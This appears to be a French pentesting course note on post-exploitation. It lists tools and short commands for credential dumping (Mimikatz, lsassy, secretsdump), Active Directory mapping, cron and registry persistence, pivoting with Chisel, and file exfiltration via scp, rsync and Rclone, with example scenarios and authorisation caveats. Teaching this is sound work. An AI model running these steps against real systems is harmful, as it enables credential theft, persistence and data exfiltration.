
## 🎯 Post-Exploitation

---

## Introduction

La phase de <span class="concept">post-exploitation</span> consiste à tirer profit d’un accès élevé (root, SYSTEM, Domain Admin) pour :

- Maintenir un accès persistant
- Étendre son contrôle (latéral ou vertical)
- Exfiltrer des données sensibles
- Préparer le reporting final

Cette étape requiert une grande rigueur : **en pentest pro, il faut minimiser l’impact métier**.

---

## Objectifs

- <span class="goal">Maintenir un accès durable (persistance)</span>
- <span class="goal">Explorer et extraire des données sensibles</span>
- <span class="goal">Évaluer l’exposition globale du SI</span>

---

## Outils & commandes

| Outil | Exemple & explication |
|-------|-----------------------|
| <span class="technology">Mimikatz</span> | <span class="example">lsadump::lsa /inject /name:</span> → extraction secrets Windows |
| <span class="technology">lsassy</span> | <span class="example">lsassy --hashes</span> → dump credentials |
| <span class="technology">secretsdump.py (Impacket)</span> | <span class="example">impacket-secretsdump target</span> |
| <span class="technology">BloodHound</span> | <span class="example">SharpHound.exe -c All</span> → cartographie de l’environnement AD |
| <span class="technology">CrackMapExec</span> | <span class="example">cme smb target --users</span> |
| <span class="technology">ssh-agent hijack</span> | <span class="example">volatilisation de sessions SSH actives</span> |
| <span class="technology">Rclone</span> | <span class="example">exfiltration discrète vers cloud</span> |
| <span class="technology">scp / rsync</span> | <span class="example">exfiltration via SSH contrôlé</span> |
| <span class="technology">Proxychains / Chisel</span> | <span class="example">pivot réseau vers segments internes</span> |

---

## Techniques principales

| Technique | Exemple |
|-----------|---------|
| <span class="concept">Persistence Windows</span> | scheduled tasks, registry run keys, service install |
| <span class="concept">Persistence Linux</span> | cronjobs, systemd, SSH key implant |
| <span class="concept">Credential dumping</span> | Mimikatz, lsassy, secretsdump |
| <span class="concept">Active Directory mapping</span> | BloodHound |
| <span class="concept">Data exfiltration</span> | Rclone, SCP, rsync |
| <span class="concept">Pivot / tunnel</span> | Chisel, Ligolo, Proxychains |

---

## Bonnes pratiques

- <span class="best-practice">Limiter les traces laissées sur la cible</span>
- <span class="best-practice">Ne pas exfiltrer de données sensibles réelles sans accord</span>
- <span class="best-practice">Logger toutes les actions post-exploitation</span>
- <span class="mitigation">En prod : ne jamais activer de persistance permanente</span>
- <span class="best-practice">Toujours vérifier les autorisations pour l’exfiltration</span>

---

## 🎯 Exemple de scénario

> <span class="note">🎯 Cible :</span> Domaine Windows avec accès Domain Admin

Actions :
- <span class="technology">secretsdump.py DC</span> → dump de tous les hashes du domaine
- <span class="technology">lsassy</span> → extraction de tokens Admin
- <span class="technology">BloodHound</span> → cartographie des trusts et chemins vers DA
- <span class="technology">Chisel</span> → pivot vers un subnet finance isolé
- <span class="technology">scp *.docx analyst@pivotbox</span> → exfiltration des fichiers sensibles
- Nettoyage des scheduled tasks créées

> <span class="note">🐧 Cible :</span> Linux serveur de bases de données

Actions :
- <span class="technology">cronjob implanté</span> → persistence pour retour ultérieur
- <span class="technology">ssh-agent hijack</span> → récupération d’accès admin
- <span class="technology">rsync</span> → exfiltration contrôlée des dumps SQL

---

## Cheatlist outils post-exploitation

| Cible | Outils clés |
|-------|------------|
| Windows | Mimikatz, lsassy, secretsdump, BloodHound, CME |
| Linux | LinPEAS post-exploit, ssh-agent hijack, cron abuse |
| Pivot | Chisel, Ligolo, Proxychains |
| Exfiltration | Rclone, rsync, scp, SMBClient |

---

## 🚀 Navigation

- 🚀 [[08_Password_Cracking]]
